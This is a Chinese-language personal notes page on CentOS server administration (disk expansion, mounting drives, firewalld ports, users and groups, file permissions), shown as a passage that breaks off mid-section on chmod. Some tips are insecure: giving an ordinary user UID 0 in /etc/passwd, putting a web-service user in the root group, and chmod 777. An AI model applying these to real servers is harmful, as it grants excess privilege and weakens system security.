> ==**硬盘分区的存储空间满了，哈哈哈哈**==
>
> 

```shell
#查看硬盘使用情况
df -h
[root@dev0x01 tomcat01]# df -h
Filesystem               Size  Used Avail Use% Mounted on
devtmpfs                 2.8G     0  2.8G   0% /dev
tmpfs                    2.8G     0  2.8G   0% /dev/shm
tmpfs                    2.8G   13M  2.8G   1% /run
tmpfs                    2.8G     0  2.8G   0% /sys/fs/cgroup
/dev/mapper/centos-root   10G   10G   24M 100% /
/dev/sda1               1014M  185M  830M  19% /boot
tmpfs                    560M     0  560M   0% /run/user/1000

#竟然看到 100%，虚拟机总共 20G，各个分区空间大小加起来，还真占满了，哈哈哈哈
#咋整？扩容呗！先给虚拟机再加个 20G（虚拟机要关机，还要删除历史快照），注意！！扩展之前，有必要把系统镜像备份！
#方式一，界面操作，虚拟机设置-磁盘-扩展，评论有说扩展后开不了机的，有一定的风险
#方式二，命令操作，进入VMware的安装目录, 然后执行命令
vmware-vdiskmanager -x 40GB D:/UbuntuDesk/Ubuntu.vmdk
#命令只是操作一个磁盘文件，有多个磁盘文件的，不太清楚怎么操作了，看来只能用界面操作了

#扩容后，只是硬盘空间大了，各个分区的空间还是原样，还得进一步把新扩展的空间，分配到需要加空间的分区
#磁盘分区
##查看已有分区
[root@dev0x01 dev0x01]# fdisk -l

Disk /dev/sda: 42.9 GB, 42949672960 bytes, 83886080 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x000dbba7

   Device Boot      Start         End      Blocks   Id  System
/dev/sda1   *        2048     2099199     1048576   83  Linux
/dev/sda2         2099200    27273215    12587008   8e  Linux LVM

Disk /dev/mapper/centos-root: 10.7 GB, 10737418240 bytes, 20971520 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/mapper/centos-swap: 2147 MB, 2147483648 bytes, 4194304 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

##选择要操作的分区
fdisk /dev/sda
Welcome to fdisk (util-linux 2.23.2).

Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.

##输入m可以显示帮助信息
Command (m for help): m
Command action
   a   toggle a bootable flag
   b   edit bsd disklabel
   c   toggle the dos compatibility flag
   d   delete a partition
   g   create a new empty GPT partition table
   G   create an IRIX (SGI) partition table
   l   list known partition types
   m   print this menu
   n   add a new partition
   o   create a new empty DOS partition table
   p   print the partition table
   q   quit without saving changes
   s   create a new empty Sun disklabel
   t   change a partition's system id
   u   change display/entry units
   v   verify the partition table
   w   write table to disk and exit
   x   extra functionality (experts only)

###输入n添加一个新分区
###在后面的分区类型选择中输入p(创建主分区), 其余的设施保持默认值即可
###最后输入w保持分区结果

#具体操作命令有点多，详情参考
- Linux基础教程 - VMware虚拟机CentOS 7 磁盘扩容 https://www.linuxidc.com/Linux/2019-04/158346.html
- VMware Workstation 扩容 Linux 虚拟机硬盘容量 https://blog.kjarbo.com/archives/962.html


```



##### 挂载fat32格式的u盘

```shell
# 插入u盘，查看u盘设备文件名，比如是/dev/sdb1
[root@localhost ~]# fdisk -l

# 新建一个挂载点，一般要在/mnt下建立
[root@localhost mnt]# mkdir /mnt/usb

# 挂载
[root@localhost mnt]# mount -t vfat /dev/sdb1 /mnt/usb

# 拔出u盘前要记得卸载
[root@localhost ~]# umount /mnt/usb
#或者
[root@localhost ~]# umount /dev/sdb1

# 注：不能再usb目录内卸载，会显示正忙，切换到其他目录下卸载u盘。


```



##### 挂载NTFS格式的移动硬盘

```shell
默认情况下，linux是不支持NTFS格式的，所以要先安装一个插件NTFS-3G

1.下载NTFS-3G插件
http://www.tuxera.com/community/ntfs-3g-download/

2.安装NTFS-3G

#解压
[root@localhost ~]# tar -zvxf ntfs-3g_ntfsprogs-2013.1.13.tgz  
#进入解压目录
[root@localhost ~]# cd ntfs-3g_ntfsprogs-2013.1.13/
#编译准备，没有指定安装目录，安装到默认位置中
[root@localhost ~]# ./configure
#编译
[root@localhost ~]# make
#编译安装
[root@localhost ~]# make install

#插入移动硬盘，查看移动硬盘的设备文件名
[root@localhost ~]# fdisk -l

#在/mnt目录下建立一个挂载点
[root@localhost ~]# mkdir /mnt/HardDisk

#挂载
[root@localhost HardDisk]# mount -t ntfs-3g /dev/sdc1 /mnt/HardDisk/

#进入/mnt/HardDisk目录，可以看到移动硬盘里的内容了

#拔出移动硬盘前要记得卸载
[root@localhost ~]# umount /mnt/HardDisk/


```



#### 防火墙设置

##### 查看防火墙服务状态

```shell
systemctl status firewalld

查看防火墙状态（需要 root 权限）
firewall-cmd --state

启动
systemctl start firewalld.service
停止
systemctl stop firewalld.service
禁用
systemctl disable firewalld.service
启用
systemctl enable firewalld.service

```



##### 开启、重启、关闭、firewalld.service服务

```shell
# 开启
service firewalld start
# 重启
service firewalld restart
# 关闭
service firewalld stop

```



##### 查看防火墙规则

```shell
firewall-cmd --list-all

```



##### 查询、开放、关闭端口

```shell
# 查询端口是否开放
firewall-cmd --query-port=3306/tcp
# 开放端口
sudo firewall-cmd --zone=public --permanent --add-port=80/tcp
sudo firewall-cmd --zone=public --permanent --add-port=3306/tcp
# 移除端口
firewall-cmd --permanent --remove-port=3306/tcp
# 开放一个范围的端口
firewall-cmd --permanent --zone=public --add-port=100-500/tcp
firewall-cmd --permanent --zone=public --add-port=100-500/udp

# 重启防火墙（修改配置后要重启防火墙）
sudo firewall-cmd --reload

# 参数解释
1)	firwall-cmd：是Linux提供的操作firewall的一个工具
2)	--permanent：表示设置为持久
3)	--add-port：标识添加的端口

```



#### 禁用ipv6

[centos7上如何禁用ipv6](https://www.jianshu.com/p/225d040d0b66)

 

#### 开机自启

##### 查看开机启动项

systemctl list-unit-files  (查看开机启动项)

systemctl list-unit-files  |  grep 程序名称  （查看某些服务开机启动状态）

systemctl  list-unit-files |  grep enabled （查看哪些为开机启动服务）



##### 添加开机启动项

systemctl enable docker



#### 关机命令

重启命令：

reboot 普通重启

shutdown -r now 立刻重启(root用户使用)

shutdown -r 10 过10分钟自动重启(root用户使用)

shutdown -r 20:35 在时间为20:35时候重启(root用户使用)

 

如果是通过shutdown命令设置重启计划的话，可以用shutdown -c命令取消重启

 

关机命令：

关机只有root组用户才有权限！

关机之前，尽可能保证当前系统中没有其他用户在登录系统。可以使用who命令查看是否还有其他人登录，或者使用命令ps -aux查看是否还有后台进程运行。

 

halt 立刻关机(root用户使用)，系统停止，屏幕可能会保留系统已经停止的讯息

poweroff 立刻关机(root用户使用)，系统关机，所以没有提供额外的电力，屏幕空白

shutdown/shutdown -h now 立刻关机(root用户使用)

shutdown -h 10 10分钟后自动关机

 

如果是通过shutdown命令设置关机计划的话，可以用shutdown -c命令取消重启

 

1.shutdown

　　shutdown命令安全地将系统关机。 有些用户会使用直接断掉电源的方式来关闭linux，

　　这是十分危险的。因为linux与windows不同，其后台运行着许多进程，所以强制关机可能

　　会导致进程的数据丢失﹐使系统处于不稳定的状态﹐甚至在有的系统中会损坏硬件设备。

　　而在系统关机前使用shutdown命令﹐系统管理员会通知所有登录的用户系统将要关闭。

　　并且login指令会被冻结﹐即新的用户不能再登录。直接关机或者延迟一定的时间才关机

　　都是可能的﹐还可能重启。这是由所有进程〔process〕都会收到系统所送达的信号〔signal〕

　　决定的。这让像vi之类的程序有时间储存目前正在编辑的文档﹐而像处理邮件〔mail〕和

　　新闻〔news〕的程序则可以正常地离开等等。

　　shutdown执行它的工作是送信号〔signal〕给init程序﹐要求它改变runlevel。

　　Runlevel 0被用来停机〔halt〕﹐runlevel 6是用来重新激活〔reboot〕系统﹐

　　而runlevel 1则是被用来让系统进入管理工作可以进行的状态﹔这是预设的﹐假定没有-h也

　　没有-r参数给shutdown。要想了解在停机〔halt〕或者重新开机〔reboot〕过程中做了哪些

　　动作﹐你可以在这个文件/etc/inittab里看到这些runlevels相关的资料。

　　shutdown 参数说明:

　　[-t] 在改变到其它runlevel之前﹐告诉init多久以后关机。

　　[-r] 重启计算器。

　　[-k] 并不真正关机﹐只是送警告信号给每位登录者〔login〕。

　　[-h] 关机后关闭电源〔halt〕。

　　[-n] 不用init﹐而是自己来关机。不鼓励使用这个选项﹐而且该选项所产生的后果往

　　往不总是你所预期得到的。

　　[-c] cancel current process取消目前正在执行的关机程序。所以这个选项当然没有

　　时间参数﹐但是可以输入一个用来解释的讯息﹐而这信息将会送到每位使用者。

　　[-f] 在重启计算器〔reboot〕时忽略fsck。

　　[-F] 在重启计算器〔reboot〕时强迫fsck。

　　[-time] 设定关机〔shutdown〕前的时间。

　　

2.halt—-最简单的关机命令

　　其实halt就是调用shutdown -h。halt执行时﹐杀死应用进程﹐执行sync系统调用﹐

　　文件系统写操作完成后就会停止内核。

　　参数说明:

　　[-n] 防止sync系统调用﹐它用在用fsck修补根分区之后﹐以阻止内核用老版本的超

　　级块〔superblock〕覆盖修补过的超级块。

　　[-w] 并不是真正的重启或关机﹐只是写wtmp〔/var/log/wtmp〕纪录。

　　[-d] 不写wtmp纪录〔已包含在选项[-n]中〕。

　　[-f] 没有调用shutdown而强制关机或重启。

　　[-i] 关机〔或重启〕前﹐关掉所有的网络接口。

　　[-p] 该选项为缺省选项。就是关机时调用poweroff。

　　

3.reboot

　　reboot的工作过程差不多跟halt一样﹐不过它是引发主机重启﹐而halt是关机。它

　　的参数与halt相差不多。

　　

4.init

　　init是所有进程的祖先﹐它的进程号始终为1﹐所以发送TERM信号给init会终止所有的

　　用户进程﹑守护进程等。shutdown 就是使用这种机制。init定义了8个运行级别(runlevel)，

　　init 0为关机﹐init 1为重启。关于init可以长篇大论﹐这里就不再叙述。另外还有

　　telinit命令可以改变init的运行级别﹐比如﹐telinit -iS可使系统进入单用户模式﹐

　　并且得不到使用shutdown时的信息和等待时间。

linux如何修改root管理员密码

　　以root 身份登录(SSH操作)

　　输入 passwd 命令 就可以看到提示输入新密码了

输入密码的时候是看不到字符的。



#### 环境变量$PATH

echo $PATH 查看当前用户的环境变量

 

1.不同身份使用者默认的PATH不同，默认能够随意运行的命令也不同(如root与vbird)；

2.PATH是可以修改的，所以一般使用者还是可以透过修改PATH来运行某些位於/sbin或/usr/sbin下的命令来查询；

3.使用绝对路径或相对路径直接指定某个命令的档名来运行，会比搜寻PATH来的正确；

4.命令应该要放置到正确的目录下，运行才会比较方便；

5.本目录(.)最好不要放到PATH当中。

 

CentOS 中永久修改环境变量

Linux是一个多用户的操作系统。每个用户登录系统后，都会有一个专用的运行环境。通常每个用户默认的环境都是相同的，这个默认环境实际上就是一组环境变量的定义。用户可以对自己的运行环境进行定制，其方法就是修改相应的系统环境变量。

 

通过修改.bashrc和/etc/profile文件可以修改环境变量

 

使用修改.bashrc文件进行环境变量的编辑，只对当前用户有用。

使用修改/etc/profile文件进行环境变量的编辑，是对所有用户有用。

进入/etc/profile

输入指令，回车，打开profile

 

vim /etc/profile 

添加路径

按Insert，并在末尾添加

 

\#node path

export NODE_HOME=/usr/local/node/bin

export PATH=$NODE_HOME:$PATH

其中/usr/local/node/bin就是本次要添加的路径

按下ESC并输入:wq以保存退出

 

输入指令并回车，刷新修改完的环境变量文件

source /etc/profile

 

CentOS 6.5 $PATH原始内容：

/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin

 

PATH设定方法(临时)

$ export PATH=$PATH:/usr/local/scala/bin

 

PATH设定方法(永久)

单个用户

上记临时方法的命令行，追加到home目录下的 .bash_profile文件的最后一行

 

全部用户

上记临时方法的命令行，追加到/etc/profile文件的最后一行

 

ps:这个文件是login的时候才生效的，因此需要马上生效的情况，请执行以下命令

source .bash_profile

或者

source /etc/profile



#### 用户管理

##### 查看所有的用户和组信息

```shell
# 查看用户
cat /etc/passwd
[root@iZwz9e8czk342iic7vuw8tZ ~]# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin

cat /etc/passwd|grep 用户名
cat /etc/passwd|grep root

```

![image-20210502142502406](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/user-group-info.png)



```shell
# 查看用户组
cat /etc/group
[root@iZwz9e8czk342iic7vuw8tZ ~]# cat /etc/group
root:x:0:
bin:x:1:
daemon:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mem:x:8:
kmem:x:9:
wheel:x:10:
cdrom:x:11:
mail:x:12:postfix
man:x:15:
dialout:x:18:
floppy:x:19:
games:x:20:
tape:x:33:
video:x:39:
ftp:x:50:
lock:x:54:
audio:x:63:
nobody:x:99:
users:x:100:
utmp:x:22:
utempter:x:35:
input:x:999:
systemd-journal:x:190:
systemd-network:x:192:
dbus:x:81:
polkitd:x:998:
ssh_keys:x:997:
sshd:x:74:
postdrop:x:90:
postfix:x:89:
chrony:x:996:
nscd:x:28:
tcpdump:x:72:

cat /etc/group|grep 组名，用于查找某个用户组

```



![image-20210502143005708](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/group-info.png)



用户和组常用命令

```shell
groups 查看当前登录用户的组内成员
groups test 查看test用户所在的组,以及组内成员
whoami 查看当前登录用户角色

newgrp 组名，切换到登录用户的其他组，前提是该用户加入了多个组。

```



##### 创建、查询、修改、删除用户、用户组和群组（CRUD）

[Linux 用户和用户组管理](https://www.runoob.com/linux/linux-user-manage.html)

[账号管理](http://cn.linux.vbird.org/linux_basic/0410accountmanager_2.php)



```bash
useradd
userdel
usermod
cat /etc/passwd
passwd

groupadd
groupdel
groupmod
groups test
cat /etc/group
newgrp test

```





##### 将普通用户设置为root权限组

添加用户
#useradd tommy 
//添加一个名为tommy的用户
#passwd tommy   //修改密码
Changing password for user tommy.
New UNIX password:     //在这里输入新密码
Retype new UNIX password:  //再次输入新密码
passwd: all authentication tokens updated successfully.

赋予root权限 
方法一： 修改 /etc/sudoers 文件，找到下面一行，把前面的注释（#）去掉



##Allows people in group wheel to run all commands

%wheel    ALL=(ALL)    ALL
然后修改用户，使其属于root组（wheel），命令如下：
#usermod -g root tommy
修改完毕，现在可以用tommy帐号登录，然后用命令 su - ，即可获得root权限进行操作。

方法二（推荐）： 修改 /etc/sudoers 文件，找到下面一行，在root下面添加一行，如下所示：



##Allow root to run any commands anywhere

root    ALL=(ALL)     ALL
tommy   ALL=(ALL)     ALL
修改完毕，现在可以用tommy帐号登录，然后用命令 su - ，即可获得root权限进行操作。



方法三： 修改 /etc/passwd 文件，找到如下行，把用户ID修改为 0 ，如下所示：
tommy:x:500:500:tommy:/home/tommy:/bin/bash
修改后如下
tommy:x:0:500:tommy:/home/tommy:/bin/bash
保存，用tommy账户登录后，直接获取的就是root帐号的权限。



#### 文件与目录管理

##### 文件目录结构

![image-20210502143818427](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/file-path-structure.png)



![image-20210502143831714](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/file-path-structure-02.png)



/bin：

bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。

 

/boot：

这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。

 

/dev ：

dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。

 

/etc：

etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。

 

/home：

用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。

 

/lib：

lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。

 

/lost+found：

这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。

 

/media：

linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。

 

/mnt：

系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 /mnt/ 上，然后进入该目录就可以查看光驱里的内容了。

 

/opt：

opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。

 

/proc：

proc 是 Processes(进程) 的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。

这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：

echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

 

/root：

该目录为系统管理员，也称作超级权限者的用户主目录。

 

/sbin：

s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。

 

/selinux：

 这个目录是 Redhat/CentOS 所特有的目录，Selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。

 

/srv：

 该目录存放一些服务启动之后需要提取的数据。

 

/sys：

这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs 。

 

sysfs 文件系统集成了下面3种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。

 

该文件系统是内核设备树的一个直观反映。

 

当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。

 

/tmp：

tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。

 

/usr：

 usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。

 

/usr/bin：

系统用户使用的应用程序。

 

/usr/sbin：

超级用户使用的比较高级的管理程序和系统守护程序。

 

/usr/src：

内核源代码默认的放置目录。

 

/var：

var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。

 

/run：

是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。

 

 

系统启动必须：

/boot：存放的启动Linux 时使用的内核文件，包括连接文件以及镜像文件。

/etc：存放所有的系统需要的配置文件和子目录列表，更改目录下的文件可能会导致系统不能启动。

/lib：存放基本代码库（比如c++库），其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。

/sys： 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中

 

指令集合：

/bin：存放着最常用的程序和指令

/sbin：只有系统管理员能使用的程序和指令。

外部文件管理：

 

/dev ：Device(设备)的缩写, 存放的是Linux的外部设备。注意：在Linux中访问设备和访问文件的方式是相同的。

/media：类windows的其他设备，例如U盘、光驱等等，识别后linux会把设备放到这个目录下。

/mnt：临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。

 

临时文件：

/run：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。

/lost+found：一般情况下为空的，系统非法关机后，这里就存放一些文件。

/tmp：这个目录是用来存放一些临时文件的。

 

账户：

/root：系统管理员的用户主目录。

/home：用户的主目录，以用户的账号命名的。

/usr：用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。

/usr/bin：系统用户使用的应用程序与指令。

/usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。

/usr/src：内核源代码默认的放置目录。

 

运行过程中要用：

/var：存放经常修改的数据，比如程序运行的日志文件（/var/log 目录下）。

/proc：管理内存空间！虚拟的目录，是系统内存的映射，我们可以直接访问这个目录来，获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件来做修改。

 

扩展用的：

/opt：默认是空的，我们安装额外软件可以放在这个里面。

/srv：存放服务启动后需要提取的数据（不用服务器就是空）



##### 绝对路径与相对路径

绝对路径：路径的写法『一定由根目录 / 写起』，例如： /usr/share/doc 这个目录。

相对路径：路径的写法『不是由 / 写起』，例如由 /usr/share/doc 要到 /usr/share/man 底下时，可以写成： 『cd ../man』这就是相对路径的写法啦！相对路径意指『相对於目前工作目录的路径！』



##### 链接概念

Linux 链接分两种，一种被称为硬链接（Hard Link），另一种被称为符号链接（Symbolic Link）。默认情况下，ln 命令产生硬链接。

 

硬连接

硬连接指通过索引节点来进行连接。在 Linux 的文件系统中，保存在磁盘分区中的文件不管是什么类型都给它分配一个编号，称为索引节点号(Inode Index)。在 Linux 中，多个文件名指向同一索引节点是存在的。比如：A 是 B 的硬链接（A 和 B 都是文件名），则 A 的目录项中的 inode 节点号与 B 的目录项中的 inode 节点号相同，即一个 inode 节点对应两个不同的文件名，两个文件名指向同一个文件，A 和 B 对文件系统来说是完全平等的。删除其中任何一个都不会影响另外一个的访问。

 

硬连接的作用是允许一个文件拥有多个有效路径名，这样用户就可以建立硬连接到重要文件，以防止“误删”的功能。其原因如上所述，因为对应该目录的索引节点有一个以上的连接。只删除一个连接并不影响索引节点本身和其它的连接，只有当最后一个连接被删除后，文件的数据块及目录的连接才会被释放。也就是说，文件真正删除的条件是与之相关的所有硬连接文件均被删除。

 

软连接

另外一种连接称之为符号连接（Symbolic Link），也叫软连接。软链接文件有类似于 Windows 的快捷方式。它实际上是一个特殊的文件。在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。比如：A 是 B 的软链接（A 和 B 都是文件名），A 的目录项中的 inode 节点号与 B 的目录项中的 inode 节点号不相同，A 和 B 指向的是两个不同的 inode，继而指向两块不同的数据块。但是 A 的数据块中存放的只是 B 的路径名（可以根据这个找到 B 的目录项）。A 和 B 之间是“主从”关系，如果 B 被删除了，A 仍然存在（因为两个是不同的文件），但指向的是一个无效的链接。

 

通过实验加深理解

[oracle@Linux]$ touch f1     #创建一个测试文件f1

[oracle@Linux]$ ln f1 f2     #创建f1的一个硬连接文件f2

[oracle@Linux]$ ln -s f1 f3    #创建f1的一个符号连接文件f3

[oracle@Linux]$ ls -li      # -i参数显示文件的inode节点信息

total 0

9797648 -rw-r--r-- 2 oracle oinstall 0 Apr 21 08:11 f1

9797648 -rw-r--r-- 2 oracle oinstall 0 Apr 21 08:11 f2

9797649 lrwxrwxrwx 1 oracle oinstall 2 Apr 21 08:11 f3 -> f1

从上面的结果中可以看出，硬连接文件 f2 与原文件 f1 的 inode 节点相同，均为 9797648，然而符号连接文件的 inode 节点不同。

 

[oracle@Linux]$ echo "I am f1 file" >>f1

[oracle@Linux]$ cat f1

I am f1 file

[oracle@Linux]$ cat f2

I am f1 file

[oracle@Linux]$ cat f3

I am f1 file

[oracle@Linux]$ rm -f f1

[oracle@Linux]$ cat f2

I am f1 file

[oracle@Linux]$ cat f3

cat: f3: No such file or directory

通过上面的测试可以看出：当删除原始文件 f1 后，硬连接 f2 不受影响，但是符号连接 f1 文件无效

 

总结

依此您可以做一些相关的测试，可以得到以下全部结论：

删除符号连接f3,对f1,f2无影响；

删除硬连接f2，对f1,f3也无影响；

删除原文件f1，对硬连接f2没有影响，导致符号连接f3失效；

同时删除原文件f1,硬连接f2，整个文件会真正的被删除。



##### 文件与目录操作

cd 

.     代表此层目录

..    代表上一层目录

\-     代表前一个工作目录

~     代表『目前使用者身份』所在的家目录

~account 代表 account 这个使用者的家目录(account是个帐号名称)

 

ls: 列出目录文件

cd：变换目录

pwd：显示目前的目录

mkdir：创建一个新的目录

rmdir：删除一个空的目录

 

touch：新建一个文件

 

复制、删除、移动(重命名): cp, rm, mv



##### 改变文件所属用户组、文件拥有者、文件属性

https://blog.csdn.net/xyw_blog/article/details/15165209



文件与目录的默认权限与隐藏权限

http://cn.linux.vbird.org/linux_basic/0220filemanager_4.php

 

chgrp：改变用户组

chown：改变文件拥有者

chmod：改变文件属性（权限、 SUID、SGID、SBIT）



chgrp 更改文件所属用户组

首先要知道如何查看文件所属用户组：ls -l 命令，例如：

-rw------- 1 xyw root 27616196 11月 8 10:08 test.tar.gz

包括9列，分别为：文件属性、文件硬链接数或子目录数、文件拥有者、文件拥有者所在组、文件大小（字节）、文件创建月份、文件创建日期、文件创建时间、文件名。



更改单个文件用户组：chgrp xyw test.tar.gz

更改文件夹用户组：chgrp -R root test



chown 更改文件所有者（有颜色图片及区块分明对比黑白大片文字能增强人的阅读意愿，让人更轻松地阅读并更快地理解）

**基本语法：**

chown [-R] 账号名称 文件或目录

chown [-R] 账号名称:用户组名称 文件或目录

**参数**：

-R : 进行递归( recursive )的持续更改，即连同子目录下的所有文件、目录

都更新成为这个用户组。常常用在更改某一目录的情况。

**示例****1**：

[root@localhost home]# touch testfile //由 root 用户创建文件 

[root@localhost home]# ls testfile –l 

-rw--w--w- 1 root root 0 Jun 7 19:35 testfile //文件的拥有者及拥有者级均为 root 

[root@localhost home]# chown yangzongde testfile //修改文件拥有者为 yangzongde 

[root@localhost home]# ls testfile -l 

-rw--w--w- 1 yangzongde root 0 Jun 7 19:35 testfile //查看文件拥有者为 yangzongde，但组仍为 root 

**示例****2**：

chown bin install.log

ls -l

-rw-r--r--  1 bin  users 68495 Jun 25 08:53 install.log

chown root:root install.log

ls -l

-rw-r--r--  1 root root 68495 Jun 25 08:53 install.log



实际案例遇到的问题：

\# 部署web站点需要将普通用户加入root组，并将Tomcat文件夹及其子目录文件都加入root组。普通用户启动Tomcat监听不了80端口？需要把项目换成其他端口（8081），再使用IPtable监听重定向到80

chgrp root tomcat7 #修改文件夹所属组

usermod -g root dfhjx #将用户加入root组

groups dfhjx #查看用户所在组



chmod 更改文件权限属性

文件属性的设置有2种方法：使用数字或者符号。



1）数字

linux文件的属性有9个，即owner/group/others组别的read/write/execute属性，即文件拥有者/文件用户组/其他组对文件的读/写/执行权限。

-rwxrwxrwx

这9个属性，三个为一组，可以使用数字表示各个属性：

r:4    w:2   x:1

同一组的三个属性需要累加，例如：-rwxr-xr--



owner=rwx=4+2+1=7

group=r-x=4+0+1=5

others=r--=4+0+0=4



所以在设置属性时，数字为754.



格式：chmod [-R] xyz 文件或目录

xyw即属性的数字。举例说明：

更改前：

-rw------- 1 xyw xyw 27616196 11月 8 10:08 test3.zip

更改test3.zip的文件属性为：-rwxrwxrwx，即777

chmod 777 test3.zip

更改后：

-rwxrwxrwx 1 xyw xyw 27616196 11月 8 10:08 test3.zip

更改test3.zip文件属性为：-rwxr--r--，即744

chmod 744 test3.zip

更改后：

-rwxr--r-- 1 xyw xyw 27616196 11月 8 10:08 test3.zip

经常使用的场景：我们平时建立的文件属性通常为-rw-rw-r--，如果想将其变成可执行文件，且不希望他人修改的话，即-rwxr-xr-x，即755。



2）符号

从上文介绍的9个属性看，分别是1)user 2)group 3)others 三组，分别使用u、g、o表示，此外，a表示全部，即全部的三组。读写属性可以写成：r、w、x。



格式：chmod u/g/o/a +（加入）/-（除去）/=（设置） r/w/x

举例：设置test3.zip的属性为：-rwxr-xr-x，即：chmod u=rwx,go=rx test3.zip （注：u=rwx,go=rx 中间不能有空格）



user：具有可读、可写、可执行权限

group和others：具有可读、可执行



更改前：

-rwxrw-rw- 1 xyw xyw 27616196 11月 8 10:08 test3.zip

更改后：

-rwxr-xr-x 1 xyw xyw 27616196 11月 8 10:08 test3.zip

设置test3.zip属性为：-rwxrw-r--，即：chmod u=rwx,g=rw,o=r test3.zip

更改后：

-rwxrw-r-- 1 xyw xyw 27616196 11月 8 10:08 test3.zip

如果不知道文件原先的属性只是想增加或除去属性，可以使用+、-

举例：



为每个用户增加对test3.zip的执行权限：chmod a+x test3.zip

更改后：

